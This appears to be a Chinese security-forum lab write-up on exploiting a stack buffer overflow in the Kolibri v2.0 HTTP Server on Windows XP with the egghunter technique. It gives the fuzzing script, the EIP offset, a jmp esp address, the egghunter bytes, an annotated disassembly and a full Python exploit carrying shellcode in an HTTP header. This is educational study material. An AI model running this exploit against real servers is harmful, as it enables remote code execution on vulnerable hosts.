
# [原创]Kolibri v2.0-Buffer Overflow分析及利用

## 前言

实验主机: Windows xp sp3

工具: Immunity Debugger

Hex Workshop v5.1

漏洞程序: Kolibri v2.0 HTTP Server 版本: 2.0

之前看过一些关于EggHunters技术的文章,但是一直也未进行实践,趁着正好有时间,在网上找到了相关的漏洞软件,准备学习一番。

## 漏洞分析：寻找溢出点

EggHunters技术是Staged ShellCode技术的一种，寻蛋指令的目的是为了搜索整个内存空间(栈/堆/...)找到我们真正的shellcode并执行它，如果可用的溢出缓冲区放不下整个shellcode代码，就可以用Egg Hunting技术

前置条件:

必须能够跳转,并且执行一些shellcode(寻蛋指令)，

最终执行的ShellCode必须在内存的某个位置(堆,栈)

最终执行的ShellCode的前面必须存在唯一标识，寻蛋指令就是逐字节进行查找唯一标识

打开虚拟机,因为软件为绿色软件直接运行即可无需安装

开启服务以后,我们先写一个简单的python测试脚本,看我们下载的程序是否存在远程溢出漏洞

```
import socket

poc = "A" * 1000;

buffer = (
"HEAD /" + poc + " HTTP/1.1\r\n"
"Host: 192.168.1.2:8080\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

expl = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
expl.connect(("192.168.1.29",8080));      #目标IP,8080默认端口
expl.send(buffer);
expl.close();
```

当我们用本机运行测试脚本给Kolibri 2.0 HTTP Server发送包含1000个’A’的http头,Kolibri 2.0直接退出了程序,说明我们的测试起到了效果,然后我们再使用ImmDebug以调试的方式打开Kolibri 2.0.

使用mona插件生成600个测试字符:`!mona pattern_create 600`,ImmDebug会在调试器根目录下生成一个以pattern命名的.txt文件,此文件中就保存的则是我们的600个测试字符.

我们把测试脚本中的1000个”A”,替换成我们的测试字符:

```
poc = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9";
```

替换完以后,再次开启Kolibri2.0程序,在本机运行测试脚本.

可以看到我们的调试器弹出了一个窗口,提示不知道怎么继续,因为地址`0x32724131`不能读,我们把`32724131`放到mona插件中搜索一下,是否存在于我们的测试字符中.

mona插件搜索到了,这个段字符的偏移为515,我们验证一下我们找到的覆盖EIP的位置,把第516~519个字节改为ABBA,然后再次测试

确实为ABBA的Ascii码.说明我们已经控制了程序的EIP, 此程序有多种利用方法,这里我们使用EggHunters技术

### 构建缓冲区:

因为一般使用EggHunters技术是因为缓冲区空间有限不能存放我们所有的ShellCode,所以先存放一小段寻蛋指令在溢出缓冲区中,通过这段小指令去寻找我们的大本营(主ShellCode),然后执行主ShellCode.因为空间有限所有我们只能把寻蛋指令放置在溢出缓冲区.现在我们来构建溢出缓冲区的结构:

我们需要一个jmp esp指令的地址与向后跳转的指令还有寻蛋指令

Jmp esp地址可以使用mona插件查找jmp esp指令:`!mona jmp -r esp`,可以找到一大堆可以使用的地址,我们在其中选取一条;

`0x7d5a30d7` : jmp esp |  {PAGE_EXECUTE_READ} [SHELL32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v6.00.2900.5512 (C:\WINDOWS\system32\SHELL32.dll)

JmpEgg指令可以使用”`\xEB\xC4`” //短跳转指令EB，长度-60(0xc4)因为短跳转的范围是-128~127，所以最高正数为7F,大于7F就为负跳转,C4为负跳转;

寻蛋指令可以使用mona插件:`!mona egghunter` 生成的寻蛋指令如下,标记为w00tw00t

"`\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74`"

"`\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7`"

现在用”`\xd7\x30\x5a\x7d`”替换jmpEsp的位置,”`\xEB\xC4`”替换JmpEgg的位置,把寻蛋指令从’`\xEB\xC4`’的下一个字节’`\x33`’向后数60个字节处开始添加

`Buffer = "A" * 461 + EggCode(54) + "\xd7\x30\x5a\x7d" + "\xEB\xC4"`

因为在一般编辑程序不好编辑十六进制代码,所以我新创建一个文件(sc.sc)把ShellCode放置到此文件中使用Hex Workshop进行编辑十六进制,poc脚本直接打开sc.sc文件进行读取就可以了

构造好Buffer后再次启动漏洞程序,运行POC之前先使用ImmDebug快捷键Ctrl + G跳转到`0x7d5a30d7`处下一个断点,避免程序跑飞,然后运行POC,

运行POC可以看到程序跳转到了我们指定的位置,

F7 顺着我们指定的指令执行,程序jmp到了esp寄存器指向的位置,此位置中存放的正好是我们的短跳转指令

此短跳转指令又跳转到我们的寻蛋指令首地址,

F7跳转到寻蛋指令,寻蛋指令在内存中寻找真正的ShellCode,找到后jmp到ShellCode处,然后执行真正的ShellCode.

## 漏洞利用：

现在我们只差给漏洞程序传入一个ShellCode了,我们把ShellCode布置到http头中的Connection字段中,Poc代码,

注意：需要在ShellCode首部添加一个"w00tw00t"标签,方便寻蛋指令辨别是否为我们的ShellCode.

为什么需要放置两个连续的标记呢?因为如果只放置一个标记的话,寻蛋指令可能会把它本身的”w00t”标签当做结束标记

```
#Egg Hunter

fp = open("./sc.sc","rb+");

poc = fp.read(1024);

print"> Poc>>";

print"",poc;

shellcode = "w00tw00t"+ "\x31\xD2\xB2\x30\x64\x8B\x12\x8B\x52\x0C\x8B\x52\x1C\x8B\x42\x08\x8B\x72\x20\x8B\x12\x80\x7E\x0C\x33\x75\xF2\x89\xC7\x03\x78\x3C\x8B\x57\x78\x01\xC2\x8B\x7A\x20\x01\xC7\x31\xED\x8B\x34\xAF\x01\xC6\x45\x81\x3E\x46\x61\x74\x61\x75\xF2\x81\x7E\x08\x45\x78\x69\x74\x75\xE9\x8B\x7A\x24\x01\xC7\x66\x8B\x2C\x6F\x8B\x7A\x1C\x01\xC7\x8B\x7C\xAF\xFC\x01\xC7\x68\x74\x5F\x67\x6F\x68\x20\x40\x4C\x65\x89\xE1\x33\xC0\x88\x41\x08\x51\x50\xFF\xD7"

buffer = (
"HEAD /" + poc + " HTTP/1.1\r\n"
"Host: 192.168.1.2:8080\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
"Keep-Alive: 115\r\n"
"Connection: " + shellcode + "\r\n\r\n")

expl = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
expl.connect(("192.168.1.29",8080));  #目标IP,8080默认端口
expl.send(buffer);
expl.close();
```

```
//寻蛋指令
00031519      66:81CA FF0F  OR DX,0FFF         ;每次把低8位设置为FFF，然后下条指令+1  刚好指向第二个内存页(每1000个字节为一个内存页)，相当于每循环一次就检查一个内存页
0003151E      42            INC EDX            ;内存页最后一个地址+1,刚好移到下一个内存页首地址
0003151F      52            PUSH EDX           ;保存EDX
00031520      6A 02         PUSH 2             ;为NtAccessCheckAndAuditAlarm推送0x2
 ;或NtDisplayString推送0x43
00031522      58            POP EAX            ;0x2 或 0x43 进入 eax
00031523      CD 2E         INT 2E             ;Int 2E系统调用
00031525      3C 05         CMP AL,5           ;检查是否发生访问冲突(0xc0000005 == ACCESS_VIOLATION)
00031527      5A            POP EDX            ;恢复EDX寄存器
00031528    ^ 74 EF         JE SHORT DLL注入.00031519      ;若发生访问冲突则跳到Egg首部
0003152A      B8 62333366   MOV EAX,74303077   ;0xXXXXXXXX  This is the tag
0003152F      8BFA          MOV EDI,EDX                    ;设置EDI为我们的指针
00031531      AF            SCAS DWORD PTR ES:[EDI]        ;比较EDI指向的是否等于EAX中的值(tag)         SCAS --> EAX 与 ES:(E)DI 处的字节，并设置状态标志
00031532    ^ 75 EA         JNZ SHORT DLL注入.0003151E     ;判断是否找到我们的tag，未发现则跳转到INC EDX，继续查找，发现则进入第二次判断
00031534      AF            SCAS DWORD PTR ES:[EDI]        ;若tag被发现，再次确认是否为payload中的(tag) SCAS --> EAX 与 ES:(E)DI 处的字节，并设置状态标志
00031535    ^ 75 E7         JNZ SHORT DLL注入.0003151E     ;若不是payload中的tag，则跳转到 INC EDX中继续查找，否则进入调用流程
00031537    ^ FFE7          JMP EDI                        ;跳转到EDI处执行(EDI指向我们的ShellCode首部)
```

## 总结:

使用Egg Hunter需要注意ShellCode的标识必须是唯一的(通常用4个字节来定义标识，并且需要连续存放两次，因为寻蛋指令中也有标识，所以需要区分，不然寻蛋指令会把自身中的标识当做ShellCode的标识)，若有理解错误的地方还请大牛指导

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

上传的附件：

- [Kolibri v2.0-Buffer Overflow分析及利用.doc](javascript:void(0);)
  （302.50kb，24次下载）

- [Kolibri 2.0.zip](javascript:void(0);)
  （1.26MB，65次下载）
